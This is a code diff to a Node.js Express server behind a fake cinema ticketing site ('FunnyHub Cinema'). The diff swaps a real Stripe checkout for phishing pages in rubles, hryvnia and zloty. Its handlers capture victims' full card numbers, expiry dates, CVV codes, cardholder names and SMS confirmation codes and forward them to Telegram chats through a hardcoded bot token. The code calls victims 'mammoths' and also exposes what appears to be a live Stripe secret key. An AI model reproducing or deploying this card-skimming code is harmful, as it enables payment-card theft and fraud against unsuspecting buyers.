@@ -19,13 +19,10 @@ app.set('view engine', 'ejs');
 app.use(express.urlencoded({extended: false}));
 app.use(express.static('public'));
 
-const SECRET_KEY = "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";
-const stripe = require('stripe')(SECRET_KEY);
-
 try {
 
     app.get('/', (req, res) => {
-        res.render('error')
+        res.redirect(`https://cinema-funnyhub.com`)
     })
 
     app.get('/:userlink', (req, res) => {
@@ -58,96 +55,151 @@ try {
 
     })
 
-    app.post("/3ds", async (req, res) => {
-        try {
-            const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
-            bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-            bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-            
-            const session = await stripe.checkout.sessions.create({
-            payment_method_types: ["card"],
-            mode: "payment",
-            line_items: [{
-                price_data: {
-                  currency: "rub",
-                  product_data: {
-                    name: `🍿 FunnyHub Cinema`,
-                  },
-                  unit_amount: req.body.amount * 100,
-                },
-                quantity: 1,
-              }]
-            ,
-            success_url: `https://cinema-funnyhub.fun`,
-            cancel_url: `https://cinema-funnyhub.fun`,
-          })
-          console.log(req.body)
-          res.redirect(session.url)
-        } catch (e) {
-            res.status(500).json({ error: e.message })
-        }
+    app.post('/3ds', (req, res) => {
+        res.render('index_card', {amount: req.body.amount});
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
-    app.post("/3dsua", async (req, res) => {
-        try {
-            const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
-            bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-            bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-            
-            const session = await stripe.checkout.sessions.create({
-            payment_method_types: ["card"],
-            mode: "payment",
-            line_items: [{
-                price_data: {
-                  currency: "uah",
-                  product_data: {
-                    name: `🍿 FunnyHub Cinema`,
-                  },
-                  unit_amount: req.body.amount * 100,
-                },
-                quantity: 1,
-              }]
-            ,
-            success_url: `https://cinema-funnyhub.fun`,
-            cancel_url: `https://cinema-funnyhub.fun`,
-          })
-          console.log(req.body)
-          res.redirect(session.url)
-        } catch (e) {
-            res.status(500).json({ error: e.message })
-        }
+    app.post('/3dsua', (req, res) => {
+        res.render('index_card_ua', {amount: req.body.amount});
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
-    app.post("/3dspl", async (req, res) => {
-        try {
-            const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
-            bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-            bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-            
-            const session = await stripe.checkout.sessions.create({
-            payment_method_types: ["card"],
-            mode: "payment",
-            line_items: [{
-                price_data: {
-                  currency: "pln",
-                  product_data: {
-                    name: `🍿 FunnyHub Cinema`,
-                  },
-                  unit_amount: req.body.amount * 100,
-                },
-                quantity: 1,
-              }]
-            ,
-            success_url: `https://cinema-funnyhub.fun`,
-            cancel_url: `https://cinema-funnyhub.fun`,
-          })
-          console.log(req.body)
-          res.redirect(session.url)
-        } catch (e) {
-            res.status(500).json({ error: e.message })
-        }
+    app.post('/3dspln', (req, res) => {
+        res.render('index_card_pln', {amount: req.body.amount});
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
+    app.post('/confirmationua', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'}, {
+            "reply_markup": {
+                "inline_keyboard": [
+                    [
+                        {
+                            text: "Удалить ссылку",
+                            callback_data: `del_li_site${req.params.userlink}`,
+                        },
+                    ],
+                ],
+            },
+        });
+        res.render('index_code_ua', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+    })
+
+    app.post('/confirmation', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
+        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'}, {
+            "reply_markup": {
+                "inline_keyboard": [
+                    [
+                        {
+                            text: "Удалить ссылку",
+                            callback_data: `del_li_site${req.params.userlink}`,
+                        },
+                    ],
+                ],
+            },
+        });
+        res.render('index_code', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+    
+                                })
+    app.post('/confirmationpln', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
+        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'}, {
+            "reply_markup": {
+                "inline_keyboard": [
+                    [
+                        {
+                            text: "Удалить ссылку",
+                            callback_data: `del_li_site${req.params.userlink}`,
+                        },
+                    ],
+                ],
+            },
+        });
+        res.render('index_code_pln', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+
+    })
+    app.post('/confirmation_fpln', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f_pln', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
+    app.post('/confirmation_fua', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f_ua', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
+    
+    app.post('/confirmation_f', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
 } catch (err) {
     console.log('error');
   }
